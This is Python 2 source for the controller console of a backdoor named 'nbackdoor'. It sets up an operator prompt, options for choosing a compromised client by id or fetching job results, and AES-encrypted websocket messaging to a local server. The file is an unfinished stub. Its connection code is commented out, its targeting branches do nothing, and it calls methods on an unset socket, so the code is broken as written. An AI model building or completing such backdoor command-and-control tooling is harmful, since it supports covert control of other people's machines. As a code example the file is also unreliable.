#!/usr/bin/env python
# coding:utf-8
import argparse
import os
import ctypes
import subprocess
import threading
import chardet
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class ControllerClient(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'http://127.0.0.1:8888'
        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                # print 'finding server...'
                # self.ws = create_connection("ws://localhost:8888/")
                # print 'server connected.'
                #
                # sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
                # self.ws.send(json.dumps(sercret_msg))
                #
                # time.sleep(1)

                while True:
                    command = raw_input('nbackdoor:')

                    args_str = command[command.find(' '):]
                    parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
                                                    version='1.0.0',
                                                    formatter_class=argparse.RawTextHelpFormatter,
                                                    epilog='neko!')
                    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
                    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
                    args = parser.parse_args(args_str)

                    parser.print_help()

                    if args.id:
                        print 'run id'
                        pass

                    elif args.jobid:
                        print 'run jobid'
                        pass

                    msg = json.loads(self.ws.recv())
                    if 'data' in msg:
                        data = self.decrypt(msg['data'])
                        print data

                # self.ws.close()

            except Exception as e:
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def send_msg(self, data):
        msg = {'data': self.encrypt(data)}
        self.ws.send(json.dumps(msg))

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


if __name__ == '__main__':
    ControllerClient()
    while True:
        time.sleep(10)


